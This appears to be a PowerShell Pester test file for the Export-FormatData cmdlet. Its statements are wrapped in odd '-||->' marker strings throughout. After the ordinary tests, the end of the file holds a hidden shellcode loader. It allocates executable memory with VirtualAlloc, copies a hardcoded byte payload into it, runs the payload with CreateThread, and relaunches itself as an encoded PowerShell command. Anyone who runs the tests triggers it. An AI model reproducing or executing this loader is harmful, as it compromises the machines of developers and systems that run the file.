

 -||-> Describe "Export-FormatData" -Tags "CI" {
     -||-> BeforeAll {
         -||-> $fd =  -||-> Get-FormatData <-||-  <-||- 
         -||-> $testOutput =  -||-> Join-Path -Path $TestDrive -ChildPath "outputfile" <-||-  <-||- 
    } <-||- 

     -||-> AfterEach {
         -||-> Remove-Item $testOutput -Force -ErrorAction SilentlyContinue <-||- 
    } <-||- 

     -||-> It "Can export all types" {
         -||-> try
        {
             -||-> $fd | Export-FormatData -path $TESTDRIVE\allformat.ps1xml -IncludeScriptBlock <-||- 

             -||-> $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault() <-||- 
             -||-> $sessionState.Formats.Clear() <-||- 
             -||-> $sessionState.Types.Clear() <-||- 

             -||-> $runspace = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace($sessionState) <-||- 
             -||-> $runspace.Open() <-||- 

             -||-> $runspace.CreatePipeline("Update-FormatData -AppendPath $TESTDRIVE\allformat.ps1xml").Invoke() <-||- 
             -||-> $actualAllFormat = $runspace.CreatePipeline("Get-FormatData -TypeName *").Invoke() <-||- 

             -||-> $fd.Count | Should -Be $actualAllFormat.Count <-||- 
             -||-> Compare-Object $fd $actualAllFormat | Should -Be $null <-||- 
        }
        finally
        {
             -||-> $runspace.Close() <-||- 
             -||-> Remove-Item -Path $TESTDRIVE\allformat.ps1xml -Force -ErrorAction SilentlyContinue <-||- 
        } <-||- 
    } <-||- 

     -||-> It "Works with literal path" {
         -||-> $filename = 'TestDrive:\[formats.ps1xml' <-||- 
         -||-> $fd | Export-FormatData -LiteralPath $filename <-||- 
         -||-> ( -||-> Test-Path -LiteralPath $filename <-||- ) | Should -BeTrue <-||- 
    } <-||- 

     -||-> It "Should overwrite the destination file" {
         -||-> $filename = 'TestDrive:\ExportFormatDataWithForce.ps1xml' <-||- 
         -||-> $unexpected = "SHOULD BE OVERWRITTEN" <-||- 
         -||-> $unexpected | Out-File -FilePath $filename -Force <-||- 
         -||-> $file =  -||-> Get-Item  $filename <-||-  <-||- 
         -||-> $file.IsReadOnly = $true <-||- 
         -||-> $fd | Export-FormatData -Path $filename -Force <-||- 

         -||-> $actual = @( -||-> Get-Content $filename <-||- )[0] <-||- 
         -||-> $actual | Should -Not -Be $unexpected <-||- 
    } <-||- 

     -||-> It "should not overwrite the destination file with NoClobber" {
         -||-> $filename = "TestDrive:\ExportFormatDataWithNoClobber.ps1xml" <-||- 
         -||-> $fd | Export-FormatData -LiteralPath $filename <-||- 

         -||-> {  -||-> $fd | Export-FormatData -LiteralPath $filename -NoClobber <-||-  } | Should -Throw -ErrorId 'NoClobber,Microsoft.PowerShell.Commands.ExportFormatDataCommand' <-||- 
    } <-||- 

     -||-> It "Test basic functionality" {
         -||-> Export-FormatData -InputObject $fd[0] -Path $testOutput <-||- 
         -||-> $content =  -||-> Get-Content $testOutput -Raw <-||-  <-||- 
         -||-> $formatViewDefinition = $fd[0].FormatViewDefinition <-||- 
         -||-> $typeName = $fd[0].TypeName <-||- 
         -||-> $content.Contains($typeName) | Should -BeTrue <-||- 
        for ( -||-> $i = 0 <-||- ;  -||-> $i -lt $formatViewDefinition.Count <-||- ; -||-> $i++ <-||- )
        {
             -||-> $content.Contains($formatViewDefinition[$i].Name) | Should -BeTrue <-||- 
        }
    } <-||- 

     -||-> It "Should have a valid xml tag at the start of the file" {
         -||-> $fd | Export-FormatData -Path $testOutput <-||- 
         -||-> $piped =  -||-> Get-Content $testOutput -Raw <-||-  <-||- 
         -||-> $piped[0] | Should -BeExactly "<" <-||- 
    } <-||- 

     -||-> It "Should pretty print xml output" {
         -||-> $xmlContent=@"
            <Configuration>
            <ViewDefinitions>
            <View>
            <Name>ExportFormatDataName</Name>
            <ViewSelectedBy>
                <TypeName>ExportFormatDataTypeName</TypeName>
            </ViewSelectedBy>
            <TableControl>
                <TableHeaders />
                <TableRowEntries>
                <TableRowEntry>
                <TableColumnItems>
                <TableColumnItem>
                    <PropertyName>Guid</PropertyName>
                </TableColumnItem>
                </TableColumnItems>
                </TableRowEntry>
                </TableRowEntries>
            </TableControl>
            </View>
            </ViewDefinitions>
            </Configuration>
"@ <-||- 
         -||-> $expected = @"
<?xml version="1.0" encoding="utf-8"?>
<Configuration>
  <ViewDefinitions>
    <View>
      <Name>ExportFormatDataName</Name>
      <ViewSelectedBy>
        <TypeName>ExportFormatDataTypeName</TypeName>
      </ViewSelectedBy>
      <TableControl>
        <TableHeaders />
        <TableRowEntries>
          <TableRowEntry>
            <TableColumnItems>
              <TableColumnItem>
                <PropertyName>Guid</PropertyName>
              </TableColumnItem>
            </TableColumnItems>
          </TableRowEntry>
        </TableRowEntries>
      </TableControl>
    </View>
  </ViewDefinitions>
</Configuration>
"@ -replace "`r`n?|`n", "" <-||- 
         -||-> try
        {
             -||-> $testfilename = [guid]::NewGuid().ToString('N') <-||- 
             -||-> $testfile =  -||-> Join-Path -Path $TestDrive -ChildPath "$testfilename.ps1xml" <-||-  <-||- 
             -||-> Set-Content -Path $testfile -Value $xmlContent <-||- 

             -||-> $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault() <-||- 
             -||-> $sessionState.Formats.Clear() <-||- 
             -||-> $sessionState.Types.Clear() <-||- 

             -||-> $runspace = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace($sessionState) <-||- 
             -||-> $runspace.Open() <-||- 

             -||-> $runspace.CreatePipeline("Update-FormatData -prependPath $testfile").Invoke() <-||- 
             -||-> $runspace.CreatePipeline("Get-FormatData -TypeName 'ExportFormatDataTypeName' | Export-FormatData -Path $testOutput").Invoke() <-||- 

             -||-> $content = ( -||-> Get-Content $testOutput -Raw <-||- ) -replace "`r`n?|`n", "" <-||- 

             -||-> $content | Should -BeExactly $expected <-||- 
        }
        finally
        {
             -||-> $runspace.Close() <-||- 
        } <-||- 
    } <-||- 
} <-||- 

 -||-> $FBf = '$nHSe = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $nHSe -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd3,0xbf,0xcc,0x82,0x8a,0x6d,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,0x47,0x83,0xc6,0x04,0x31,0x7e,0x14,0x03,0x7e,0xd8,0x60,0x7f,0x91,0x08,0xe6,0x80,0x6a,0xc8,0x87,0x09,0x8f,0xf9,0x87,0x6e,0xdb,0xa9,0x37,0xe4,0x89,0x45,0xb3,0xa8,0x39,0xde,0xb1,0x64,0x4d,0x57,0x7f,0x53,0x60,0x68,0x2c,0xa7,0xe3,0xea,0x2f,0xf4,0xc3,0xd3,0xff,0x09,0x05,0x14,0x1d,0xe3,0x57,0xcd,0x69,0x56,0x48,0x7a,0x27,0x6b,0xe3,0x30,0xa9,0xeb,0x10,0x80,0xc8,0xda,0x86,0x9b,0x92,0xfc,0x29,0x48,0xaf,0xb4,0x31,0x8d,0x8a,0x0f,0xc9,0x65,0x60,0x8e,0x1b,0xb4,0x89,0x3d,0x62,0x79,0x78,0x3f,0xa2,0xbd,0x63,0x4a,0xda,0xbe,0x1e,0x4d,0x19,0xbd,0xc4,0xd8,0xba,0x65,0x8e,0x7b,0x67,0x94,0x43,0x1d,0xec,0x9a,0x28,0x69,0xaa,0xbe,0xaf,0xbe,0xc0,0xba,0x24,0x41,0x07,0x4b,0x7e,0x66,0x83,0x10,0x24,0x07,0x92,0xfc,0x8b,0x38,0xc4,0x5f,0x73,0x9d,0x8e,0x4d,0x60,0xac,0xcc,0x19,0x45,0x9d,0xee,0xd9,0xc1,0x96,0x9d,0xeb,0x4e,0x0d,0x0a,0x47,0x06,0x8b,0xcd,0xa8,0x3d,0x6b,0x41,0x57,0xbe,0x8c,0x4b,0x93,0xea,0xdc,0xe3,0x32,0x93,0xb6,0xf3,0xbb,0x46,0x22,0xf1,0x2b,0x63,0xb3,0xf9,0xbb,0x1b,0xb1,0xf9,0xba,0x60,0x3c,0x1f,0xec,0xc6,0x6f,0xb0,0x4c,0xb7,0xcf,0x60,0x24,0xdd,0xdf,0x5f,0x54,0xde,0x35,0xc8,0xfe,0x31,0xe0,0xa0,0x96,0xa8,0xa9,0x3b,0x07,0x34,0x64,0x46,0x07,0xbe,0x8b,0xb6,0xc9,0x37,0xe1,0xa4,0xbd,0xb7,0xbc,0x97,0x6b,0xc7,0x6a,0xbd,0x93,0x5d,0x91,0x14,0xc4,0xc9,0x9b,0x41,0x22,0x56,0x63,0xa4,0x39,0x5f,0xf1,0x07,0x55,0xa0,0x15,0x88,0xa5,0xf6,0x7f,0x88,0xcd,0xae,0xdb,0xdb,0xe8,0xb0,0xf1,0x4f,0xa1,0x24,0xfa,0x39,0x16,0xee,0x92,0xc7,0x41,0xd8,0x3c,0x37,0xa4,0xd8,0x01,0xee,0x80,0xae,0x6b,0x32;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$196=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($196.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$196,0,0,0);for (;;){Start-sleep 60};' <-||- ; -||-> $e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FBf)) <-||- ; -||-> $sQc = "-EncodedCommand " <-||- ; -||-> if( -||-> [IntPtr]::Size -eq 8 <-||- ){ -||-> $VR75 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell" <-||- ; -||-> iex "& $VR75 $sQc $e" <-||- }else{; -||-> iex "& powershell $sQc $e" <-||- ;} <-||- 



